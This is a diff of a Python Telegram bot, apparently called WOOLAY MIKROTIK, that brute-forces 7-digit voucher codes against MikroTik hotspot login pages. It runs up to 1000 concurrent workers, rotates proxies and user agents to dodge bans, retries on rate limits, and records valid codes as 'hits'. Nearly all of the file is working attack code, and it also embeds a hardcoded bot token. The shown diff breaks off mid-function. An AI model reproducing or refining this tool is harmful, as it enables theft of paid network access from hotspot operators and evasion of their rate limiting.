@@ -1,14 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-  WOOLAY MIKROTIK — Best Version
-  1000W · Async · Ban-Proof · Railway Fix · Keep-Alive
-  
-  requirements.txt:
-    aiohttp
-    aiohttp-socks
-    python-telegram-bot==20.7
-    flask
+  WOOLAY MIKROTIK — Clean Working Version
 """
 
 import os
@@ -20,55 +13,61 @@ import string
 import asyncio
 import datetime
 import warnings
-import signal
 from urllib.parse import urlparse
-from typing import Optional, Tuple, List, Dict, Any
+from typing import Optional, List, Dict, Any, Tuple, Set
 
 warnings.filterwarnings("ignore")
 
+# ── aiohttp ──
 import aiohttp
 
+HAS_SOCKS = False
 try:
     from aiohttp_socks import ProxyConnector
     HAS_SOCKS = True
 except ImportError:
-    HAS_SOCKS = False
+    pass
 
+# ── telegram ──
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.constants import ParseMode
 from telegram.ext import (
-    Application, CommandHandler, MessageHandler,
-    CallbackQueryHandler, filters,
+    Application,
+    CommandHandler,
+    MessageHandler,
+    CallbackQueryHandler,
+    filters,
 )
 
+# ── flask keep alive ──
 from flask import Flask, Response
 from threading import Thread
 
-# ==============================================================================
-#  KEEP ALIVE — Railway PORT
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  KEEP ALIVE — Railway / Replit
+# ═══════════════════════════════════════════════════════════════
 
-_web_app = Flask(__name__)
+web_app = Flask(__name__)
 
-@_web_app.route('/')
-def _home():
-    return "⚡ WOOLAY is alive!", 200
+@web_app.route("/")
+def web_home():
+    return "WOOLAY alive", 200
 
-@_web_app.route('/health')
-def _health():
+@web_app.route("/health")
+def web_health():
     return Response("OK", status=200)
 
-def _run_web():
+def web_run():
     port = int(os.environ.get("PORT", 8080))
-    _web_app.run(host="0.0.0.0", port=port)
+    web_app.run(host="0.0.0.0", port=port)
 
 def keep_alive():
-    t = Thread(target=_run_web, daemon=True)
+    t = Thread(target=web_run, daemon=True)
     t.start()
 
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 #  OUTPUT
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 
 try:
     sys.stdout.reconfigure(line_buffering=True)
@@ -76,330 +75,406 @@ try:
 except Exception:
     pass
 
-def log(*a, **k):
-    k.setdefault("flush", True)
-    print(*a, **k)
+def log(*args, **kwargs):
+    kwargs.setdefault("flush", True)
+    print(*args, **kwargs)
 
-R  = "\x1b[0m"
 RED   = "\x1b[1;31m"
-GRN   = "\x1b[1;32m"
-YLW   = "\x1b[33m"
-CYN   = "\x1b[1;36m"
+GREEN = "\x1b[1;32m"
+YELLOW= "\x1b[33m"
+CYAN  = "\x1b[1;36m"
+RESET = "\x1b[0m"
 
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 #  CONFIG
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 
 BOT_TOKEN   = os.environ.get("BOT_TOKEN", "8806693453:AAEK1F7FTsAHMc5PdfeIYeIlWHJgbnGRb8o")
 ADMIN_IDS   = [8806693453]
-OWNER       = "@Woolay"
-OWNER_LINK  = "https://t.me/Woolay"
+OWNER       = "@Woolay_bot"
+OWNER_LINK  = "https://t.me/Woolay_bot"
 
 HIT_FILE    = "hits.txt"
 PROXY_FILE  = "proxies.txt"
 STATE_FILE  = "state.json"
 TRIED_TPL   = "tried_{}.txt"
 
-# ── Worker ──
-WORKERS           = 1000
-MAX_PER_SESSION   = 200
-COOLDOWN          = 0.002
-REST_BETWEEN_SESS = 2
-REQ_TIMEOUT       = 15
-CONN_LIMIT        = 500
-CONN_PER_HOST     = 100
-DNS_TTL           = 300
+NUM_WORKERS      = 1000
+MAX_CODES_SESSION= 200
+COOLDOWN         = 0.001
+REST_BETWEEN     = 2
+REQ_TIMEOUT      = 15
+CONN_LIMIT       = 500
+CONN_PER_HOST    = 100
+DNS_CACHE_TTL    = 300
 
-# ── Code ──
-CODE_LEN   = 7
-CODE_TOTAL = 10 ** CODE_LEN
+CODE_LENGTH      = 7
+CODE_TOTAL       = 10 ** CODE_LENGTH
 
-# ── Flush ──
-STATE_FLUSH = 20
-CODE_FLUSH  = 15
+STATE_FLUSH_SEC  = 20
+CODE_FLUSH_SEC   = 15
 
 USER_AGENTS = [
     "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 12; S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 10; Nokia5.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
 ]
 
-# ==============================================================================
-#  GLOBAL
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  GLOBAL STATE
+# ═══════════════════════════════════════════════════════════════
 
-_pm         = None
-scanners    = {}
-pending     = {}
+proxy_manager   = None
+user_scanners   = {}   # Dict[int, dict]
+pending_codes    = {}   # Dict[int, set]
 
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 #  BANNER
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 
-def banner():
-    l = "═" * 55
-    log(RED + l)
-    log("   ⚡  WOOLAY MIKROTIK • 1000W  ⚡")
-    log(f"        Telegram {OWNER}       ")
-    log(l + R)
+def show_banner():
+    line = "=" * 55
+    log(RED + line)
+    log("   WOOLAY MIKROTIK - 1000 WORKERS")
+    log(f"   Telegram {OWNER}")
+    log(line + RESET)
 
-# ==============================================================================
-#  STATE
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  STATE FILE
+# ═══════════════════════════════════════════════════════════════
 
-def _load_states():
+def load_all_states() -> dict:
     try:
-        if not os.path.exists(STATE_FILE): return {}
+        if not os.path.exists(STATE_FILE):
+            return {}
         with open(STATE_FILE, "r", encoding="utf-8") as f:
             return json.load(f)
-    except: return {}
+    except Exception:
+        return {}
 
-def _save_states(d):
+def save_all_states(data: dict):
     try:
-        t = STATE_FILE + ".tmp"
-        with open(t, "w", encoding="utf-8") as f:
-            json.dump(d, f, indent=2, ensure_ascii=False)
-        os.replace(t, STATE_FILE)
-    except: pass
+        tmp = STATE_FILE + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(data, f, indent=2, ensure_ascii=False)
+        os.replace(tmp, STATE_FILE)
+    except Exception:
+        pass
 
-def get_state(uid):  return _load_states().get(str(uid))
-def clr_state(uid):
-    a = _load_states(); a.pop(str(uid), None); _save_states(a)
+def get_saved_state(user_id: int) -> Optional[dict]:
+    return load_all_states().get(str(user_id))
 
-def save_state(uid, st):
+def clear_saved_state(user_id: int):
+    all_data = load_all_states()
+    all_data.pop(str(user_id), None)
+    save_all_states(all_data)
+
+def save_current_state(user_id: int, state: dict):
     try:
-        hits = []
-        for h in st.get("hit_details", []):
+        hit_details = []
+        for h in state.get("hit_details", []):
             t = h.get("time")
-            at = t.strftime("%Y-%m-%d %H:%M:%S") if isinstance(t, datetime.datetime) else str(t)
-            hits.append({"code": h.get("code", "?"), "at": at})
-        _save_states({**_load_states(), str(uid): {
-            "url": st.get("login_url", ""),
-            "mode": st.get("mode", "num7"),
-            "counter": st.get("counter", 0),
-            "tried": st.get("tried", 0),
-            "hits": st.get("hits", 0),
-            "limits": st.get("limits", 0),
-            "net": st.get("net", 0),
-            "failed": st.get("failed", 0),
-            "last_hit": st.get("last_hit"),
-            "started_at": st.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
-            "hit_details": hits,
-        }})
-    except: pass
+            if isinstance(t, datetime.datetime):
+                at = t.strftime("%Y-%m-%d %H:%M:%S")
+            else:
+                at = str(t)
+            hit_details.append({"code": h.get("code", "?"), "at": at})
 
-# ==============================================================================
-#  TRIED
-# ==============================================================================
+        all_data = load_all_states()
+        all_data[str(user_id)] = {
+            "url":       state.get("login_url", ""),
+            "mode":      state.get("mode", "num7"),
+            "counter":   state.get("counter", 0),
+            "tried_n":   state.get("tried_n", 0),
+            "hits":      state.get("hits", 0),
+            "limits":    state.get("limits", 0),
+            "net":       state.get("net", 0),
+            "failed":    state.get("failed", 0),
+            "last_hit":  state.get("last_hit"),
+            "started_at": state.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+            "hit_details": hit_details,
+        }
+        save_all_states(all_data)
+    except Exception as e:
+        log(RED + f"[StateSave] {e}" + RESET)
 
-def _tf(uid): return TRIED_TPL.format(uid)
+# ═══════════════════════════════════════════════════════════════
+#  TRIED CODES
+# ═══════════════════════════════════════════════════════════════
 
-def load_tried(uid):
-    f = _tf(uid)
-    if not os.path.exists(f): return set()
+def tried_filename(user_id: int) -> str:
+    return TRIED_TPL.format(user_id)
+
+def load_tried_set(user_id: int) -> Set[str]:
+    fname = tried_filename(user_id)
+    if not os.path.exists(fname):
+        return set()
     try:
-        with open(f, "r", errors="ignore") as fp:
-            return set(l.strip() for l in fp if l.strip())
-    except: return set()
+        with open(fname, "r", errors="ignore") as f:
+            return set(line.strip() for line in f if line.strip())
+    except Exception:
+        return set()
 
-def flush_tried(uid):
-    c = pending.get(uid)
-    if not c: return 0
+def flush_pending_codes(user_id: int) -> int:
+    codes = pending_codes.get(user_id)
+    if not codes:
+        return 0
     try:
-        with open(_tf(uid), "a", encoding="utf-8") as f:
-            for x in c: f.write(f"{x}\n")
-        n = len(c); pending[uid] = set(); return n
-    except: return 0
+        with open(tried_filename(user_id), "a", encoding="utf-8") as f:
+            for c in codes:
+                f.write(c + "\n")
+        count = len(codes)
+        pending_codes[user_id] = set()
+        return count
+    except Exception:
+        return 0
 
-def clr_tried(uid):
-    pending.pop(uid, None)
+def clear_tried(user_id: int):
+    pending_codes.pop(user_id, None)
     try:
-        f = _tf(uid)
-        if os.path.exists(f): os.remove(f)
-    except: pass
+        fname = tried_filename(user_id)
+        if os.path.exists(fname):
+            os.remove(fname)
+    except Exception:
+        pass
 
-def add_tried(uid, code):
-    if uid not in pending: pending[uid] = set()
-    pending[uid].add(code)
+def add_pending(user_id: int, code: str):
+    if user_id not in pending_codes:
+        pending_codes[user_id] = set()
+    pending_codes[user_id].add(code)
 
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 #  HIT FILE
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 
-def write_hit(code):
+def write_hit(code: str):
     try:
+        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         with open(HIT_FILE, "a", encoding="utf-8") as f:
-            f.write(f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {code}\n")
-    except: pass
+            f.write(f"[{now}] {code}\n")
+    except Exception:
+        pass
 
-# ==============================================================================
-#  FLUSH LOOPS
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  BACKGROUND FLUSHER
+# ═══════════════════════════════════════════════════════════════
 
-async def _code_flusher():
+async def code_flush_loop():
     while True:
         try:
-            await asyncio.sleep(CODE_FLUSH)
-            for u in list(pending): flush_tried(u)
+            await asyncio.sleep(CODE_FLUSH_SEC)
+            for uid in list(pending_codes.keys()):
+                flush_pending_codes(uid)
         except asyncio.CancelledError:
-            for u in list(pending): flush_tried(u)
+            for uid in list(pending_codes.keys()):
+                flush_pending_codes(uid)
             raise
-        except: pass
+        except Exception:
+            pass
 
-async def _state_flusher():
+async def state_flush_loop():
     while True:
         try:
-            await asyncio.sleep(STATE_FLUSH)
-            for u, s in list(scanners.items()):
-                if s.get("running"): save_state(u, s)
+            await asyncio.sleep(STATE_FLUSH_SEC)
+            for uid, st in list(user_scanners.items()):
+                if st.get("running"):
+                    save_current_state(uid, st)
         except asyncio.CancelledError:
-            for u, s in list(scanners.items()):
-                if s.get("running"): save_state(u, s)
+            for uid, st in list(user_scanners.items()):
+                if st.get("running"):
+                    save_current_state(uid, st)
             raise
-        except: pass
+        except Exception:
+            pass
 
-# ==============================================================================
-#  PROXY
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  PROXY MANAGER
+# ═══════════════════════════════════════════════════════════════
 
-class ProxyMgr:
-    def __init__(self, fp):
-        self.fp = fp
-        self.proxies = []
-        self.bad = set()
+class ProxyManager:
+    def __init__(self, filepath: str):
+        self.filepath = filepath
+        self.proxies: List[str] = []
+        self.bad_proxies: Set[str] = set()
         self.lock = asyncio.Lock()
-        self.idx = 0
+        self.index = 0
         self.load()
 
     @staticmethod
-    def _norm(p):
-        p = (p or "").strip()
-        if not p or p.startswith("#"): return None
-        if not p.startswith(("http://","https://","socks4://","socks5://")):
-            p = "socks5://" + p
-        return p
+    def normalize(proxy: str) -> Optional[str]:
+        proxy = (proxy or "").strip()
+        if not proxy or proxy.startswith("#"):
+            return None
+        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
+            proxy = "socks5://" + proxy
+        return proxy
 
     @staticmethod
-    def _valid(p):
+    def validate(proxy: str) -> bool:
         try:
-            r = p.split("://",1)[1] if "://" in p else p
-            if "@" in r: r = r.split("@",1)[1]
-            h, pt = r.rsplit(":",1)
-            return bool(h and pt) and 1 <= int(pt) <= 65535
-        except: return False
+            rest = proxy.split("://", 1)[1] if "://" in proxy else proxy
+            if "@" in rest:
+                rest = rest.split("@", 1)[1]
+            host, port = rest.rsplit(":", 1)
+            if not host or not port:
+                return False
+            return 1 <= int(port) <= 65535
+        except Exception:
+            return False
 
     def load(self):
         try:
-            if not os.path.exists(self.fp):
-                open(self.fp,"w").close()
-                self.proxies = []; return
-            with open(self.fp) as f: raw = f.read().splitlines()
-            seen, v = set(), []
-            for l in raw:
-                p = self._norm(l)
-                if p and self._valid(p) and p not in seen:
-                    seen.add(p); v.append(p)
-            self.proxies = v
+            if not os.path.exists(self.filepath):
+                with open(self.filepath, "w"):
+                    pass
+                self.proxies = []
+                return
+            with open(self.filepath) as f:
+                raw = f.read().splitlines()
+            seen = set()
+            valid = []
+            for line in raw:
+                p = self.normalize(line)
+                if p and self.validate(p) and p not in seen:
+                    seen.add(p)
+                    valid.append(p)
+            self.proxies = valid
             random.shuffle(self.proxies)
-            log(GRN + f"[Proxy] {len(self.proxies)} loaded" + R if self.proxies else YLW + "[Proxy] DIRECT" + R)
+            if self.proxies:
+                log(GREEN + f"[Proxy] {len(self.proxies)} loaded" + RESET)
+            else:
+                log(YELLOW + "[Proxy] DIRECT mode" + RESET)
         except Exception as e:
-            log(RED + f"[Proxy] {e}" + R)
+            log(RED + f"[Proxy] {e}" + RESET)
 
-    def _write(self):
+    def save_file(self):
         try:
-            with open(self.fp,"w") as f: f.write("\n".join(self.proxies))
-        except: pass
+            with open(self.filepath, "w") as f:
+                f.write("\n".join(self.proxies))
+        except Exception:
+            pass
 
-    def add(self, lines):
-        a = b = 0
-        for l in lines:
-            l = l.strip()
-            if not l or l.startswith("#"): continue
-            p = self._norm(l)
-            if not p or not self._valid(p) or p in self.proxies: b += 1; continue
-            self.proxies.append(p); a += 1
-        if a: random.shuffle(self.proxies); self._write()
-        return a, b
+    def add_proxies(self, lines: List[str]) -> Tuple[int, int]:
+        added = 0
+        invalid = 0
+        for line in lines:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            p = self.normalize(line)
+            if not p or not self.validate(p) or p in self.proxies:
+                invalid += 1
+                continue
+            self.proxies.append(p)
+            added += 1
+        if added:
+            random.shuffle(self.proxies)
+            self.save_file()
+        return added, invalid
 
-    async def next(self):
+    async def get_next(self) -> Optional[str]:
         async with self.lock:
-            if not self.proxies: return None
-            p = self.proxies[self.idx % len(self.proxies)]
-            self.idx += 1; return p
+            if not self.proxies:
+                return None
+            proxy = self.proxies[self.index % len(self.proxies)]
+            self.index += 1
+            return proxy
 
-    async def bad_mark(self, p):
-        if not p: return
-        async with self.lock: self.bad.add(p)
+    async def mark_bad(self, proxy: Optional[str]):
+        if not proxy:
+            return
+        async with self.lock:
+            self.bad_proxies.add(proxy)
 
-    @property
-    def count(self): return len(self.proxies)
+    def get_count(self) -> int:
+        return len(self.proxies)
 
-def PM():
-    global _pm
-    if _pm is None: _pm = ProxyMgr(PROXY_FILE)
-    return _pm
+def get_proxy_manager() -> ProxyManager:
+    global proxy_manager
+    if proxy_manager is None:
+        proxy_manager = ProxyManager(PROXY_FILE)
+    return proxy_manager
 
-# ==============================================================================
-#  CHECKER — BAN-PROOF
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  MIKROTIK CHECKER
+# ═══════════════════════════════════════════════════════════════
 
-async def check(session, code, url, proxy):
+async def check_code(session: aiohttp.ClientSession, code: str, url: str, proxy: Optional[str]) -> Tuple[str, Optional[str]]:
+    """Check voucher code against MikroTik hotspot.
+    Returns: (result, body)
+    result: "hit" | "bad" | "limit" | "net" | "failed"
+    """
     try:
-        p = urlparse(url)
-        origin = f"{p.scheme}://{p.netloc}"
-    except: origin = url
+        parsed = urlparse(url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        login_path = f"{origin}{parsed.path}"
+    except Exception:
+        origin = url
+        login_path = url
 
-    dst = f"http://192.168.{random.randint(0,255)}.{random.randint(1,254)}/"
-    ua  = random.choice(USER_AGENTS)
+    dst = "http://connectivitycheck.gstatic.com/generate_204"
+    ua = random.choice(USER_AGENTS)
 
-    hdr = {
-        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "Accept-Language":  "en-US,en;q=0.9",
-        "Cache-Control":    "max-age=0",
-        "Connection":       "keep-alive",
-        "Content-Type":     "application/x-www-form-urlencoded",
-        "Origin":           origin,
-        "Referer":          url,
+    headers = {
+        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language":           "en-US,en;q=0.9",
+        "Cache-Control":             "max-age=0",
+        "Connection":                "keep-alive",
+        "Content-Type":              "application/x-www-form-urlencoded",
+        "Origin":                    origin,
+        "Referer":                   url,
         "Upgrade-Insecure-Requests": "1",
-        "User-Agent":       ua,
+        "User-Agent":                ua,
     }
 
-    data = {"dst": dst, "popup": "true", "username": code, "password": ""}
+    post_data = {
+        "dst":      dst,
+        "popup":    "true",
+        "username": code,
+        "password": "",
+    }
 
-    for attempt in range(5):
+    max_retry = 5
+    for attempt in range(max_retry):
         try:
             async with session.post(
-                url, data=data, headers=hdr,
+                login_path,
+                data=post_data,
+                headers=headers,
                 timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
-                ssl=False, allow_redirects=True,
-            ) as r:
-                body = await r.text()
-            lo = body.lower()
+                ssl=False,
+                allow_redirects=True,
+            ) as response:
+                body = await response.text()
 
-            # ✅ HIT
-            if "you are logged in" in lo:
-                return "hit", body
-            if "invalid username or password" not in lo \
-               and "already authorizing" not in lo \
-               and len(body) > 100 \
-               and "login" not in lo \
-               and "error" not in lo:
+            lower_body = body.lower()
+
+            # HIT
+            if "you are logged in" in lower_body:
                 return "hit", body
 
-            # ❌ BAD
-            if "invalid username or password" in lo:
+            # HIT (no error message = possibly valid)
+            if ("invalid username or password" not in lower_body
+                and "already authorizing" not in lower_body
+                and "error" not in lower_body
+                and len(body) > 100):
+                return "hit", body
+
+            # BAD
+            if "invalid username or password" in lower_body:
                 return "bad", body
 
-            # ⚠️ LIMIT
-            if "already authorizing" in lo or "retry later" in lo or "request limited" in lo or "too many" in lo:
-                if attempt < 4:
+            # LIMIT
+            limit_words = ["already authorizing", "retry later", "request limited", "too many"]
+            if any(word in lower_body for word in limit_words):
+                if attempt < max_retry - 1:
                     await asyncio.sleep(0.5 * (attempt + 1))
                     continue
                 return "limit", body
@@ -408,443 +483,689 @@ async def check(session, code, url, proxy):
 
         except asyncio.TimeoutError:
             return "net", None
-        except aiohttp.ClientConnectorError as e:
-            log(RED + f"[ConnErr] {e}" + R)
-            return "net", None
-        except aiohttp.ClientError:
-            return "net", None
-        except OSError:
+        except (aiohttp.ClientConnectorError, aiohttp.ClientError, OSError):
             return "net", None
         except asyncio.CancelledError:
             raise
-        except Exception as e:
-            log(RED + f"[CheckErr] {e}" + R)
+        except Exception:
             return "net", None
 
     return "failed", None
 
-# ==============================================================================
-#  CODE GEN
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
+#  CODE GENERATION
+# ═══════════════════════════════════════════════════════════════
 
-def seq_code(c):  return str(c).zfill(CODE_LEN)
-def rand_code():  return str(random.randint(0, CODE_TOTAL - 1)).zfill(CODE_LEN)
+def make_sequential_code(counter: int) -> str:
+    return str(counter).zfill(CODE_LENGTH)
 
-# ==============================================================================
+def make_random_code() -> str:
+    return str(random.randint(0, CODE_TOTAL - 1)).zfill(CODE_LENGTH)
+
+# ═══════════════════════════════════════════════════════════════
 #  WORKER
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 
-async def _worker(wid, uid):
-    pm = PM()
-    st = scanners.get(uid)
-    if not st: return
+async def scanner_worker(worker_id: int, user_id: int):
+    pm = get_proxy_manager()
+    state = user_scanners.get(user_id)
+    if state is None:
+        return
 
-    stop   = st["stop"]
-    tried  = st["tried"]
-    url    = st["login_url"]
-    mode   = st.get("mode", "num7")
+    stop_event  = state["stop_event"]
+    tried_set   = state["tried_set"]      # Set[str]
+    login_url   = state["login_url"]
+    mode        = state.get("mode", "num7")
 
-    while not stop.is_set():
-        proxy = await pm.next()
+    while not stop_event.is_set():
 
-        # ── Connector: တစ်ခါတစ်ရ ဖန်တီး (Railway safe) ──
-        conn = None
+        proxy = await pm.get_next()
+
+        # Create connector
+        connector = None
         try:
             if not proxy:
-                conn = aiohttp.TCPConnector(
-                    limit=CONN_LIMIT, limit_per_host=CONN_PER_HOST,
-                    ttl_dns_cache=DNS_TTL, ssl=False,
-                    enable_cleanup_closed=True, force_close=True,
-                )
-            elif HAS_SOCKS and proxy.startswith(("socks4://","socks5://")):
-                conn = ProxyConnector.from_url(
-                    proxy, rdns=True,
-                    limit=CONN_LIMIT, limit_per_host=CONN_PER_HOST,
-                    ttl_dns_cache=DNS_TTL, enable_cleanup_closed=True,
+                connector = aiohttp.TCPConnector(
+                    limit=CONN_LIMIT,
+                    limit_per_host=CONN_PER_HOST,
+                    ttl_dns_cache=DNS_CACHE_TTL,
+                    ssl=False,
+                    enable_cleanup_closed=True,
+                    force_close=True,
                 )
             elif HAS_SOCKS:
-                conn = ProxyConnector.from_url(
+                connector = ProxyConnector.from_url(
                     proxy,
-                    limit=CONN_LIMIT, limit_per_host=CONN_PER_HOST,
-                    ttl_dns_cache=DNS_TTL, enable_cleanup_closed=True,
+                    rdns=True,
+                    limit=CONN_LIMIT,
+                    limit_per_host=CONN_PER_HOST,
+                    ttl_dns_cache=DNS_CACHE_TTL,
+                    enable_cleanup_closed=True,
                 )
-        except: conn = None
+        except Exception:
+            connector = None
 
-        sess = None
+        session = None
         try:
-            sess = aiohttp.ClientSession(
-                connector=conn, connector_owner=True,
+            session = aiohttp.ClientSession(
+                connector=connector,
+                connector_owner=True,
                 cookie_jar=aiohttp.CookieJar(),
                 timeout=aiohttp.ClientTimeout(total=REQ_TIMEOUT),
                 headers={"User-Agent": random.choice(USER_AGENTS)},
             )
 
-            cnt = 0
-            fails = 0
+            codes_in_session = 0
+            net_failures = 0
 
-            while not stop.is_set() and cnt < MAX_PER_SESSION:
-                # ── code ──
+            while not stop_event.is_set() and codes_in_session < MAX_CODES_SESSION:
+
+                # Generate code
                 if mode == "num7":
-                    st["counter"] += 1
-                    if st["counter"] >= CODE_TOTAL: break
-                    code = seq_code(st["counter"])
+                    state["counter"] += 1
+                    if state["counter"] >= CODE_TOTAL:
+                        break
+                    code = make_sequential_code(state["counter"])
                 else:
-                    code = rand_code()
+                    code = make_random_code()
 
-                if code in tried: continue
+                # Skip already tried
+                if code in tried_set:
+                    continue
 
-                tried.add(code)
-                add_tried(uid, code)
-                st["cur"] = code
+                tried_set.add(code)
+                add_pending(user_id, code)
+                state["current_code"] = code
 
-                # ── check ──
-                res, body = await check(sess, code, url, proxy)
-                cnt += 1
-                st["tried"] += 1
+                # Check
+                result, body = await check_code(session, code, login_url, proxy)
+                codes_in_session += 1
+                state["tried_n"] += 1
 
-                if res == "hit":
-                    st["hits"]     += 1
-                    st["hit_list"].append(code)
-                    st["last_hit"]  = code
-                    st["logs"].append(f"🔥 {code}")
-                    st["hit_details"].append({"code": code, "time": datetime.datetime.now()})
+                if result == "hit":
+                    state["hits"] += 1
+                    state["hit_list"].append(code)
+                    state["last_hit"] = code
+                    state["recent_logs"].append(f"🔥 HIT: {code}")
+                    state["hit_details"].append({
+                        "code": code,
+                        "time": datetime.datetime.now(),
+                    })
                     write_hit(code)
-                    flush_tried(uid)
-                    save_state(uid, st)
+                    flush_pending_codes(user_id)
+                    save_current_state(user_id, state)
 
-                elif res == "limit":
-                    st["limits"] += 1
-                    st["logs"].append("⚠️ LIMIT")
+                elif result == "limit":
+                    state["limits"] += 1
+                    state["recent_logs"].append("⚠️ LIMIT")
                     break
 
-                elif res == "net":
-                    st["net"] += 1
-                    fails += 1
-                    if fails >= 3:
-                        await pm.bad_mark(proxy)
+                elif result == "net":
+                    state["net"] += 1
+                    net_failures += 1
+                    if net_failures >= 3:
+                        await pm.mark_bad(proxy)
                         break
                     break
 
-                elif res == "failed":
-                    st["failed"] += 1
+                elif result == "failed":
+                    state["failed"] += 1
                     break
 
                 else:
-                    st["failed"] += 1
+                    # "bad" - normal, keep going
+                    pass
 
-                if stop.is_set(): break
+                if stop_event.is_set():
+                    break
+
                 await asyncio.sleep(COOLDOWN)
 
-        except asyncio.CancelledError: raise
-        except: st["net"] += 1
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            state["net"] += 1
         finally:
-            if sess:
-                try: await sess.close()
-                except: pass
+            if session is not None:
+                try:
+                    await session.close()
+                except Exception:
+                    pass
 
-        if stop.is_set(): break
-        await asyncio.sleep(REST_BETWEEN_SESS)
+        if stop_event.is_set():
+            break
 
-# ==============================================================================
+        await asyncio.sleep(REST_BETWEEN)
+
+# ═══════════════════════════════════════════════════════════════
 #  DASHBOARD
-# ==============================================================================
+# ═══════════════════════════════════════════════════════════════
 
-def _hits_text(details, total, mx=30):
-    lines = [f"  ▸ <code>{h.get('code','?')}</code>" for h in details]
-    if not lines: return "🎁 <b>HITS • 0</b>\n┌─────────────┐\n  💀 None\n└─────────────┘"
-    if len(lines) > mx:
-        lines = [f"  … +{len(lines)-mx} more"] + lines[-mx:]
-    return f"🎁 <b>HITS • {total}</b>\n┌─────────────┐\n" + "\n".join(lines) + "\n└─────────────┘"
+def build_hits_text(hit_details: list, total_hits: int, max_show: int = 30) -> str:
+    lines = []
+    for h in hit_details:
+        code = h.get("code", "?")
+        lines.append(f"  ▸ <code>{code}</code>")
+    if not lines:
+        return "🎁 <b>HITS • 0</b>\n┌──────────────┐\n  💀 None yet\n└──────────────┘"
+    if len(lines) > max_show:
+        hidden = len(lines) - max_show
+        lines = [f"  … +{hidden} more"] + lines[-max_show:]
+    body = "\n".join(lines)
+    return f"🎁 <b>HITS • {total_hits}</b>\n┌──────────────┐\n{body}\n└──────────────┘"
 
-async def _dash(ctx, uid):
-    st = scanners.get(uid)
-    if not st: return
-    stop = st["stop"]
-    mid  = st.get("dash_id")
-    pm   = PM()
+async def dashboard_updater(context, user_id: int):
+    state = user_scanners.get(user_id)
+    if state is None:
+        return
+    stop_event = state["stop_event"]
+    dash_msg_id = state.get("dash_msg_id")
+    pm = get_proxy_manager()
+
     try:
-        while not stop.is_set():
-            await asyncio.sleep(5)
-            if stop.is_set(): break
-            el   = max(time.time() - st["t0"], 1)
-            spm  = int(st["tried"] / el * 60)
-            act  = pm.count
-            ll   = (st["logs"][-1:] or ["idle"])[-1]
-            px   = f"🕷️ {act}" if act else "⚡ DIRECT"
+        while not stop_event.is_set():
+            await asyncio.sleep(3)
+            if stop_event.is_set():
+                break
 
-            txt = (
+            elapsed = max(time.time() - state["start_time"], 1)
+            speed_cpm = int(state["tried_n"] / elapsed * 60)
+            proxy_count = pm.get_count()
+            recent = state["recent_logs"][-1:] if state["recent_logs"] else ["🔍 searching..."]
+            last_log = recent[-1]
+            proxy_mode = f"🕷️ {proxy_count}" if proxy_count > 0 else "⚡ DIRECT"
